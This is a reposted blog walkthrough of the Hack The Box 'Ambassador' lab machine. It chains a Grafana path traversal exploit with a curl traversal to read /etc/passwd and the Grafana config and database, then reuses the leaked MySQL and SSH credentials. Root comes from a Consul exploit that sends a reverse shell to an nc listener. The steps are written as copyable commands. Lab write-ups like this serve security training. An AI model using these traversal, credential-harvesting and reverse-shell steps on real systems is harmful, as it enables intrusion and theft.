# :game_die: Ambassador Hack the box Walkthrough - [HTB]

> **Original Source:** [Ambassador Hack the box Walkthrough - [HTB]](https://infosecwriteups.com/ambassador-hack-the-box-walkthrough-htb-2c9d81eeb293)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# Ambassador Hack the box Walkthrough — [HTB]


## Ambassador Hack the box Writeup


*source: Hack the box ambassador machine*


Hey, Guys Welcome to my blog So today we are going to discuss about **Ambassador Hack the box machine** which comes up with **path traversal vulnerability in grafana** to get the user shell and **consul service** to get the root privilege


So Let's Get started

### Enumeration:


First as usual we begin with our nmap scan

>

**STEP 1:** nmap -sC -sV 10.10.11.183


*Nmap Report 1*


*Nmap Report 2*


Further analyzing this report I have found some interesting ports and services which are 22 SSH,80 HTTP,3000 Unknown,3306 MySQL, etc.


So first we check that the unknown port which is 3000


After checking that in that browser it redirected to the grafana login


Next, I googled for any exploit for this grafana and I found that it has a directory traversal vulnerability


Link for download: [https://www.exploit-db.com/exploits/50581](https://www.exploit-db.com/exploits/50581)


So first download this exploit and run this using python

>

**STEP 2:** python3 exploit.py -H [http://10.10.11.183:3000](http://10.10.11.183:3000)


Now you can able to read the system file


So let's try for **/etc/passwd** file


Booomm!! it working


After that, I further analyzed the **grafana docs** for any interesting configuration files and I found one which is **/etc/grafana/grafana.ini**


So let’s check this file in that exploit


After analyzing this file I have found the username and password for grafana


Using these creds I have a login through that website but I don’t find the interesting thing…


After a long time of googling, I found another interesting article (Read this article for more information)


By reading this article I found that we can able to download the database file from that machine using some manual tricks

>

**STEP 3:** curl — path-as-is [http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db](http://192.168.227.181:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db) -o grafana.db


Using the above curl command we can able to download the database file


So let’s open this file using sqlite3

>

**STEP 4:** sqlite3 grafana.db


So first list out the table

>

**STEP 5:** .tables


Now the tables will be listed and next open the **data_source** file


>

**STEP 6:** select * from data_source


Now you will get the username and password for the MySQL database


So let’s use the username and password to login through MySQL

>

**STEP 7:** mysql -u grafana -p’dontStandSoCloseToMe63221!’ -h 10.10.11.183 -P 3306


Boooooommm!!! Now you get the database of that machine


So first let’s list the all databases

>

**STEP 8:** show databases;


Next, I opened the **whackywidget database** for any interesting stuff

>

**STEP 9:** use whackywidget


>

**STEP 10:** show tables;


>

**STEP 11: **select * from users;


Now we get the username and password and it is in base64 because there ==


## Get Vicky’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


So let’s decode it using base64


Booooommmmm!!!! we got the password !!


### User Flag:


So Let’s log in through SSH


**STEP 12:** ssh developer@10.10.11.183


Hurrah!!!! we get the shell


### Getting Root Privilege:


So next we going to take over the root flag of that machine


After further analyzing this I found something interesting in /opt/my-app


Here there is a .git file so let’s see the log

>

**STEP 12:** git log


Next, I opened the first commit

>

**STEP 13: **git show 33a53ef9a207976d5ceceddc41a199558843bf3c


Here I found thing weird So I googled for any exploit in consul


And I have found one amazing exploit


Using this exploit we can get the **reverse shell **using the **consul service**


So first download that exploit in that machine

>

**STEP 14:** chmod 777 exploit.py


Next, start your listener on your local machine

>

**STEP 15:** nc -lvp 555


>

**STEP 16: **python3 exploit.py — rhost 127.0.0.1 — rport 8500 — lhost 10.10.16.4 — lport 5555 — token bb03b43b-1d81-d62b-24b5–39540ee469b5


Next copy and paste the above command into that machine


Before that replace lhost with your IP


### Root Flag:


And next wait for a few more minutes you get the shell in your listener


Booomm!!! We got the root shell

>

**STEP 17: **cat root.txt


Hurrah!!! Now you will get the root flag of that machine


I hope you will understand this article if you like this please donate to us


**OSCP student:Give support and applause for this article**

### Follow me on Instagram Twitter and Linkedin


Instagram: [https://www.instagram.com/_vic_ky420/](https://www.instagram.com/_vic_ky420/)


Twitter: [https://twitter.com/Hackvick101](https://twitter.com/Hackvick101)


Linkedin: [https://www.linkedin.com/in/vignesh-r-9405a2225/](https://www.linkedin.com/in/vignesh-r-9405a2225/)

---

*Originally published on [Medium](https://infosecwriteups.com/ambassador-hack-the-box-walkthrough-htb-2c9d81eeb293). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
